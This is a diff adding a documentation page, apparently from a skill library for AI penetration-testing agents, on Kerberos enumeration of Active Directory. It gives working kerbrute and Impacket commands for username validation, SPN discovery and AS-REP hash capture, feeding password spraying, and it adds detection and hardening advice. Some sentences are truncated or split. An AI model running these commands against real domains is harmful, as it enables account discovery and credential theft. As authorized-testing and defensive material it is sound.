@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: kerberos-enum</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../index.html#agents">Agents</a>
+<a href="../index.html#brains">Brains</a>
+<a href="../index.html#playbooks">Playbooks</a>
+<a href="../index.html#decisions">Decisions</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>kerberos-enum</h2><div class="meta"><span class="badge gray">ad</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">95/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when enumerating Active Directory through Kerberos on an</p><div class="deps"><span class="kind">sub-skill of:</span> <a href="ad-enumeration.html">ad-enumeration</a></div><div class="deps"><span class="kind">requires:</span> <a href="ad-enumeration.html">ad-enumeration</a></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="kerberoasting.html">kerberoasting</a> <a href="ldap-enumeration.html">ldap-enumeration</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>Impacket</td><td>0.11.0</td></tr><tr><td>Python</td><td>3.12</td></tr></tbody></table><p>Kerberos leaks information before authentication: the KDC&#x27;s error responses distinguish valid from invalid users, and service principal names are enumerable. This skill covers credential-free Kerberos enumeration on authorized engagements: validating usernames, finding SPNs, and spotting accounts configured for AS-REP roasting. It is the pre-authentication recon that feeds kerberoasting and password attacks.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Confirm the KDC is reachable on port 88.</li>
+<li>Enumerate valid usernames through Kerberos error responses.</li>
+<li>Discover SPNs for later kerberoasting.</li>
+<li>Identify accounts with Kerberos pre-authentication disabled.</li>
+<li>Review ticket policies (lifetime, encryption types) for weaknesses.</li>
+<li>Feed validated users to password-spraying and kerberoasting phases.</li>
+</ol>
+<h2>1. User enumeration without credentials</h2>
+<pre><code class="language-bash"># kerbrute: fast username validation via KDC responses
+kerbrute userenum -d corp.example --dc 10.0.5.10 /tmp/userlist.txt \
+  -o /tmp/valid_users.txt
+
+# Impacket alternative: GetNPUsers doubles as a validator when
+# pre-auth is enabled (valid users get further in the exchange)
+python3 /opt/impacket/examples/GetNPUsers.py corp.example/ \
+  -dc-ip 10.0.5.10 -usersfile /tmp/userlist.txt 2&gt;&amp;1 | grep -v &#x27;KDC_ERR_C_PRINCIPAL_UNKNOWN&#x27; | head -20</code></pre>
+<p>A KDC that answers differently for valid versus invalid principals gives you the user list for free. Validate the list twice: false positives waste the spraying phase, false negatives miss targets.</p>
+<h2>2. SPN and pre-auth discovery</h2>
+<pre><code class="language-bash"># With any valid credential, list SPNs (kerberoasting targets)
+python3 /opt/impacket/examples/GetUserSPNs.py corp.example/testuser:&#x27;TestPass123!&#x27; \
+  -dc-ip 10.0.5.10 -request 2&gt;&amp;1 | head -20
+
+# Without credentials, probe for AS-REP roastable accounts
+python3 /opt/impacket/examples/GetNPUsers.py corp.example/ \
+  -dc-ip 10.0.5.10 -usersfile /tmp/valid_users.txt -format hashcat \
+  -outputfile /tmp/asrep.txt
+# Any hash in asrep.txt is an account with pre-auth disabled: crackable offline
+
+# Check supported encryption types (weak etypes are a finding)
+python3 - &lt;&lt;&#x27;EOF&#x27;
+# Review: look for RC4 (etype 23) still enabled domain-wide,
+# which keeps kerberoasting and overpass attacks practical
+print(&quot;Check: Get-DomainPolicy Kerberos settings on a domain-joined host&quot;)
+EOF</code></pre>
+<p>Accounts with pre-authentication disabled are the highest-value find in this phase: no password needed to get a crackable hash. Report each one individually.</p>
+<h2>3. Ticket policy review</h2>
+<pre><code class="language-powershell"># From a domain-joined host with any domain user context
+Get-ADDefaultDomainPasswordPolicy | Select-Object MaxTicketAge, MaxRenewAge
+# Long ticket lifetimes widen the window for stolen-ticket reuse
+
+# Check for unconstrained delegation while enumerating (feeds later phases)
+# via LDAP: userAccountControl flag TRUSTED_FOR_DELEGATION</code></pre>
+<p>Weak encryption types and long lifetimes are configuration findings even before any exploitation. Note them for the report&#x27;s hardening section.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>The KDC rate-limits enumeration. Slow down, use smaller batches, and</li>
+<p>resume; aggressive kerbrute can look like a password attack.</p>
+<li>Pre-auth disabled accounts return no hash. Some configurations error</li>
+<p>differently; verify with a second tool before ruling it out.</p>
+<li>The domain uses read-only DCs or trusts. Enumerate each domain in the</li>
+<p>trust separately; users do not span trusts automatically.</p>
+<li>IPv6 or alternate KDC addresses answer differently. Enumerate all DC</li>
+<p>IPs from DNS, not just the first.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>Valid users plus weak passwords suspected: hand the list to</li>
+<p>password-spraying with the engagement&#x27;s timing rules.</p>
+<li>SPNs found: hand them to kerberoast-execution for ticket cracking.</li>
+<li>AS-REP hashes captured: crack them as in dictionary-attacks, then use</li>
+<p>the credentials to start authenticated enumeration.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see Kerberos enumeration as bursts of AS-REQ packets with invalid principals, pre-auth failures, and TGS requests for many SPNs from one source. Good detection is KDC log analytics on failure patterns. Defenses are enabling pre-authentication on every account (no exceptions), disabling RC4 etypes, monitoring for enumeration bursts, and treating service accounts as high-value targets with strong random passwords.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1087.002 (Account Discovery: Domain Account).</li>
+<li>MITRE ATT&amp;CK T1558.004 (Steal or Forge Kerberos Tickets: AS-REP</li>
+<p>Roasting).</p>
+<li>CWE-287 (Improper Authentication).</li>
+<li>Impacket GetNPUsers and GetUserSPNs documentation.</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
